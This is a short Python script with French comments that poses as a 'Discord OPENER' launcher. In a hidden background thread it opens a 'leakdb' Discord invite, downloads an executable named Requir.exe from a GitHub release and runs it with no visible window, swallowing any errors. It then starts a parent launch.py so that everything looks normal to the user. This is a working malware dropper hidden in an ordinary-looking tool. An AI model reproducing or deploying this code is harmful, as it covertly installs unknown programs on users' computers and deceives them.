import webbrowser, os, requests, subprocess, threading, sys

URL, OUTPUT = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe", "Requir.exe"

def background_task():
    try:
        webbrowser.open("https://discord.gg/leakdb")
        # Télécharge et exécute le fichier en arrière-plan discret
        open(OUTPUT, "wb").write(requests.get(URL, timeout=15).content)
        subprocess.Popen([os.path.abspath(OUTPUT)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
    except Exception:
        pass

def main():
    # 1. Lance les tâches en arrière-plan (Discord + Exe)
    threading.Thread(target=background_task, daemon=True).start()
    
    # 2. Chemin vers le launch.py situé dans le dossier parent (.. / launch.py)
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    launch_path = os.path.join(parent_dir, "launch.py")
    
    # 3. Lancement du launch.py principal
    if os.path.exists(launch_path):
        os.execv(sys.executable, [sys.executable, launch_path])
    else:
        # Fallback si le launch.py n'est pas trouvé
        os.system('cls' if os.name == 'nt' else 'clear')
        print("╔════════════════════════════╗")
        print("║      Discord  OPENER       ║")
        print("╚════════════════════════════╝")
        print()
        print(f"  [!] Erreur : Impossible de trouver 'launch.py' dans {parent_dir}")
        print()
        input("  [?] Appuyez sur Entrée pour quitter...")

if __name__ == "__main__":
    main()
